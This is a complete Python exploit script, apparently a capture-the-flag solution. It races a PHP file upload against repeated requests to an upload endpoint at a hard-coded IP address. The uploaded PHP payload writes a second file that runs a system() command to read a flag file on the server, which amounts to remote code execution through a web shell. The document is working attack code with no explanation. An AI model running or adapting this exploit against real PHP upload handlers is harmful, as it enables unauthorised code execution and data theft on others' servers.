import asyncio

import aiohttp

url = "http://52.59.124.14:5010"
url_post_img = url + "/contest.php"
payload_name = "explotttt.php"
url_exploit = url + "/upload/" + payload_name

payload = """<?php
file_put_contents('explotttt.php', '<?php system("cat /var/www/html/flag.txt"); ?>');"""


async def send_image_asynchronously(image):
    async with aiohttp.ClientSession() as session:
        print("Sending image")
        async with session.post(url_post_img, data=image) as response:
            print(f"send_img: {response.status}")


async def request_repeatedly():
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url_exploit) as response:
                    print(f"req: {response.status}")
        except aiohttp.ClientConnectionError:
            print("Error: Connection failed")


async def main():
    task2 = asyncio.create_task(request_repeatedly())
    task1 = asyncio.create_task(
        send_image_asynchronously(
            {"fileToUpload": (payload_name, payload, "text/plain")}
        )
    )
    await task2
    await task1


asyncio.run(main())
